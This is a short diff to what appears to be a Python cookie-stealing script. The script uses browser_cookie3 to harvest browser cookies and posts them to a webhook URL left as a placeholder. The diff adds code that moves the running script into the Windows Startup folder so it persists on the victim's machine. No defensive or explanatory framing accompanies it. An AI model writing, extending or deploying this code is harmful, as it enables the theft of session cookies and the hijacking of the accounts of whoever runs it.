@@ -1,4 +1,4 @@
-import browser_cookie3,json,requests
+import browser_cookie3,json,requests,os,shutil,sys
 
 ##replace disshit
 webhook_url = "YA HOOK HERE"
@@ -126,3 +126,8 @@ if cookies:
             'Content-Type': 'application/json'
         }
         response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
+
+cdtostartup = os.path.abspath(sys.argv[0])
+getuser = os.environ.get("USERNAME")
+startup = fr'C:\Users\{getuser}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
+shutil.move(cdtostartup, os.path.join(startup, os.path.basename(cdtostartup)))
